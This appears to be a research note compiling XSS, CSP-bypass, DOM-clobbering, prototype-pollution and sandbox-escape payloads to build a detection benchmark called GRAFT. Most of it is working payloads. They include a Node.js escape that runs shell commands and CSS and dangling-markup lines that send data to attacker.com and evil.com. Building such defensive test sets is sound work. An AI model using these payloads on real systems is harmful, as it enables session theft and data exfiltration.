# XSS and Sandbox-Escape Payload Research

> Research conducted for GRAFT immune system benchmark corpus
> Date: 2025-01-20

---

## 1. Sources Researched

### Primary Sources

| Source | URL | Focus |
|--------|-----|-------|
| **PortSwigger XSS Cheat Sheet** | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet | Comprehensive XSS vectors with browser compatibility, event handlers, tag-based filters |
| **OWASP XSS Filter Evasion Cheat Sheet** | https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html | Classic filter bypass techniques, encoding tricks, polyglots |
| **PayloadsAllTheThings** | https://github.com/swisskyrepo/PayloadsAllTheThings | Categorized XSS, DOM clobbering, CSS injection, polyglots |
| **HackTricks** | https://hacktricks.wiki/pentesting-web/xss-cross-site-scripting/ | XSS methodology, postMessage, iframe SOP bypass |
| **DOM Clobbering Cheat Sheet** | https://github.com/ridpath/dom-clobbering-cheatsheet | 100+ DOM clobbering vectors, CSP bypass via clobbering |

### Secondary Sources

| Source | URL | Focus |
|--------|-----|-------|
| **PortSwigger xss-cheatsheet-data** | https://github.com/PortSwigger/xss-cheatsheet-data | Raw JSON data for XSS vectors, community contributions |
| **SonarSource mXSS Cheat Sheet** | https://sonarsource.github.io/mxss-cheatsheet/ | Mutation XSS through HTML parser differences |
| **PortSwigger DOM Clobbering Guide** | https://portswigger.net/web-security/dom-based/dom-clobbering | DOM clobbering methodology and labs |

---

## 2. Key Payload Patterns Identified

### A. Event Handler Injection (30+ patterns)

Event handlers are the most common XSS vector. Key patterns:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<video><source onerror="alert(1)">
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

**Browser-specific:**
```html
<video autoplay controls onwaiting=alert(1)><source src="validvideo.mp4"></video>
<audio src onerror=alert(1)>
```

### B. Protocol Handlers (15+ patterns)

```html
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
<a href="vbscript:msgbox(1)">IE only</a>
```

### C. Encoding Bypass (20+ patterns)

**Decimal/Hex HTML entities:**
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">click</a>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

**Unicode escapes:**
```html
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

**URL encoding:**
```html
<a href="javascript%3Aalert(1)">click</a>
```

### D. Polyglot Payloads (10+ patterns)

Execute in multiple contexts simultaneously:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

-->']/</script><svG x=">" onload=(co\u006efirm)``>

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/`/+/onmouseover=1/+/[*/[]/+alert(42)//'>
```

### E. Mutation XSS (mXSS) (10+ patterns)

Payloads that mutate during browser re-parsing:

```html
<noscript><img src=x onerror=alert(1)></noscript>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>
```

The browser "fixes" invalid nesting, moving the `<style>` outside its original context.

### F. DOM Clobbering (25+ patterns)

**Basic clobbering:**
```html
<a id=x name=y href="javascript:alert(1)">
<a id=x><a id=x name=y href="clobbered">
```

**Three-level deep:**
```html
<form id=x name=y><input id=z></form>
<form id=x></form>
<!-- x.y.z now accessible -->
```

**Clobbering document methods:**
```html
<html id="getElementById">clobbered</html>
<img id=getElementById>
```

**CSP bypass via clobbering:**
```html
<a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href="cid:&quot;onerror=alert(1)//">
```

### G. postMessage Attacks (15+ patterns)

**Missing origin validation:**
```javascript
// Vulnerable receiver
window.addEventListener('message', (e) => {
  eval(e.data);  // No origin check!
});

// Attack from malicious page
victim.postMessage('alert(1)', '*');
```

**Wildcards in postMessage:**
```javascript
// Sender with wildcard
target.postMessage(payload, '*'); // Leaks to any origin
```

### H. Prototype Pollution (15+ patterns)

```javascript
// Object.prototype pollution
Object.prototype.evil = true;
{}.evil; // true

// Via URL parameters
?__proto__[evil]=1
?constructor[prototype][evil]=1

// JSON merge
JSON.parse('{"__proto__": {"evil": 1}}');
```

**XSS via prototype pollution:**
```javascript
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>";
```

### I. CSS Injection / Data Exfiltration (15+ patterns)

```css
/* Attribute exfiltration via selectors */
input[value^="a"] { background: url(//attacker.com/?char=a); }

/* Sequential import chaining */
@import url(//attacker.com/stage1);

/* Scroll-based exfiltration */
div { scrollbar-color: url(//attacker.com/leak); }
```

### J. CSP Bypass Techniques (10+ patterns)

**Dangling markup:**
```html
<link rel="stylesheet" href="http://attacker.com/steal?
```

**JSONP endpoints:**
```html
<script src="//trusted.com/callback?func=alert"></script>
```

**AngularJS template injection:**
```html
<div ng-app>{{constructor.constructor('alert(1)')()}}
```

### K. Iframe Sandbox Specific (20+ patterns)

**sandbox="allow-scripts" bypass via popups:**
```html
<iframe sandbox="allow-scripts allow-popups" src="...">
<!-- Popup inherits sandbox unless allow-popups-to-escape-sandbox -->
```

**null origin attacks:**
```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>...</script>">
<!-- iframe has null origin, can bypass some checks -->
```

**srcdoc injection:**
```html
<iframe srcdoc="<img src=x onerror=alert(1)>">
```

**X-Frame-Options confusion (CVE-2024-5691):**
Sandboxed iframes can trick browsers with X-Frame-Options headers in certain conditions.

### L. JavaScript Sandbox Escape (Node.js) (10+ patterns)

**Prototype chain escape:**
```javascript
this.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id');
```

**Error prototype chain:**
```javascript
const err = new Error();
err.constructor.constructor('return process')().exit(1);
```

---

## 3. Attack Categories Relevant to Iframe Sandbox Contexts

### Category 1: Direct Script Execution
- Event handlers (onerror, onload, onclick, etc.)
- javascript: protocol in href/src attributes
- script tag injection
- data: URI scheme

**Relevance to GRAFT:** These should be caught by CSP and AST analysis.

### Category 2: DOM Manipulation
- innerHTML/outerHTML assignment
- document.write
- DOM clobbering
- Prototype pollution

**Relevance to GRAFT:** CSP blocks document.write. DOM clobbering and prototype pollution require additional runtime checks.

### Category 3: Encoding/Obfuscation
- HTML entities (decimal/hex)
- Unicode escapes
- URL encoding
- Case manipulation

**Relevance to GRAFT:** Must decode/normalize before AST analysis.

### Category 4: Parser Differential (mXSS)
- Namespace confusion (SVG, MathML)
- Invalid nesting exploitation
- Rawtext breakouts

**Relevance to GRAFT:** Critical! Browsers "fix" invalid HTML after sanitization.

### Category 5: postMessage Cross-Origin
- Missing origin validation
- Wildcard targetOrigin
- MessageEvent.data sinks

**Relevance to GRAFT:** Nerve API must validate message origins.

### Category 6: CSS-Based Attacks
- Data exfiltration via selectors
- @import chaining
- Font-based leakage

**Relevance to GRAFT:** CSP allows style-src. Must consider CSS injection risks.

### Category 7: Iframe-Specific Exploits
- Popup inheritance bypass
- null origin exploitation
- srcdoc injection
- sandbox attribute confusion

**Relevance to GRAFT:** These are the most relevant for testing organ sandboxing.

### Category 8: Resource Exhaustion
- CPU busy loops
- Memory bombs
- Infinite recursion

**Relevance to GRAFT:** Behavioral stage must detect these with timeouts and watchdogs.

### Category 9: CSP Bypass Chains
- JSONP abuse
- AngularJS template injection
- Dangling markup
- Trusted domain abuse

**Relevance to GRAFT:** Test CSP configuration robustness.

### Category 10: JavaScript Sandbox Escape (Node.js context)
- Prototype chain traversal
- constructor.constructor patterns
- vm module escapes

**Relevance to GRAFT:** Server-side AST parsing must handle these safely.

---

## 4. Recommended Payload Patterns for Organ Implementation

Based on the research, here are 30 specific payload patterns recommended for hostile organ implementation, organized by expected immune system stage detection:

### Stage 1: Static Analysis (AST) Detection

| # | Pattern | Description |
|---|---------|-------------|
| 1 | `<img src=x onerror=alert(1)>` | Basic event handler |
| 2 | `<svg onload=alert(1)>` | SVG event handler |
| 3 | `<script>eval(atob('YWxlcnQoMSk='))</script>` | Obfuscated eval |
| 4 | `<a href="javascript:alert(1)">` | javascript: protocol |
| 5 | `<iframe srcdoc="<script>alert(1)</script>">` | srcdoc injection |

### Stage 2: Manifest Validation Detection

| # | Pattern | Description |
|---|---------|-------------|
| 6 | Accessing undeclared path via `document.cookie` | Reads restricted data |
| 7 | Emitting to undeclared port | Violates manifest |
| 8 | Using banned API `window.parent.postMessage` | Direct parent access |
| 9 | Using `localStorage` instead of `nerve.read()` | Storage access |
| 10 | Direct `fetch()` to external URL | Network access |

### Stage 3: Behavioral Runtime Detection

| # | Pattern | Description |
|---|---------|-------------|
| 11 | `while(true){}` | CPU busy loop (watchdog timeout) |
| 12 | `const arr = []; while(true) arr.push(new Array(1e6))` | Memory bomb |
| 13 | Rapid `postMessage` in tight loop | Rate limit violation |
| 14 | Throw uncaught error | Totality violation |
| 15 | Infinite recursion `function f(){f()} f()` | Stack overflow |

### Stage 4: Property-Based (PBT) Detection

| # | Pattern | Description |
|---|---------|-------------|
| 16 | DOM clobbering: `<a id=x name=y>` | U3: Declaration fidelity |
| 17 | Prototype pollution: `Object.prototype.x=1` | U1: Totality under fuzz |
| 18 | Different output on second run | U4: Determinism |
| 19 | Rate limit edge case (burst then pause) | U2: Boundedness |
| 20 | Theme-specific crash | U6: Theme robustness |

### Stage 2-3: CSP Violation Detection

| # | Pattern | Description |
|---|---------|-------------|
| 21 | `<script src="https://evil.com/xss.js"></script>` | External script (blocked by CSP) |
| 22 | `<link rel="stylesheet" href="https://evil.com/xss.css">` | External CSS (may be blocked) |
| 23 | Inline event handler in inserted DOM | CSP blocks inline handlers |
| 24 | `eval(userInput)` | CSP blocks eval |
| 25 | `new Function(userInput)()` | CSP blocks dynamic code |

### Advanced: Multi-Stage Bypass Attempts

| # | Pattern | Description |
|---|---------|-------------|
| 26 | Mutation XSS: `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>` | mXSS bypasses sanitizer |
| 27 | postMessage wildcard: `postMessage({type:'eval',code:'alert(1)'},'*')` | Cross-origin message attack |
| 28 | CSS exfiltration: `<style>input[value^="secret"]{background:url(//evil.com)}</style>` | Data leak via CSS |
| 29 | Polyglot: `jaVasCript:/*--><svg/onload=alert(1)>` | Multi-context execution |
| 30 | Null origin: `<iframe sandbox="allow-scripts" src="data:text/html,<script>alert(1)</script>">` | Null origin exploitation |

---

## 5. Implementation Notes

### Payload Selection Criteria

1. **Diversity**: Cover all 10 attack categories
2. **Stage coverage**: At least 5 payloads per immune stage
3. **Browser compatibility**: Test with Chrome, Firefox, Safari
4. **Real-world relevance**: Based on actual CVE patterns
5. **Evasion difficulty**: Mix obvious and subtle attacks

### Expected Detection Rate

| Stage | Expected Catch Rate | Notes |
|-------|---------------------|-------|
| Static (AST) | 100% of script injection | If properly implemented |
| Manifest | 100% of manifest violations | Straightforward validation |
| Behavioral | 95%+ of runtime attacks | Watchdog may miss some edge cases |
| Properties (PBT) | 90%+ of invariant violations | Depends on test coverage |
| CSP | 100% of CSP violations | Browser-enforced |

### False Positive Considerations

Some benign patterns may trigger detection:
- Event handlers in comments (should be stripped by parser)
- `javascript:` in text content (not in href context)
- Large but legitimate payloads (memory limits)

### Held-Out Set Recommendations

For the benchmark:
- **50 attack patterns** (30 from above + 20 variations)
- **40 benign organs** (legitimate features using Nerve API correctly)
- **10 edge cases** (unusual but valid patterns)

---

## References

1. PortSwigger Web Security Academy - XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
2. OWASP XSS Filter Evasion Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
3. PayloadsAllTheThings - XSS Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
4. HackTricks - XSS: https://hacktricks.wiki/pentesting-web/xss-cross-site-scripting/
5. DOM Clobbering Cheat Sheet: https://github.com/ridpath/dom-clobbering-cheatsheet
6. SonarSource mXSS Cheat Sheet: https://sonarsource.github.io/mxss-cheatsheet/
7. PortSwigger - DOM Clobbering: https://portswigger.net/web-security/dom-based/dom-clobbering
8. PortSwigger - Prototype Pollution: https://portswigger.net/web-security/prototype-pollution
9. PortSwigger - CSP Bypass: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
10. Microsoft Security - postMessage Vulnerabilities: https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised
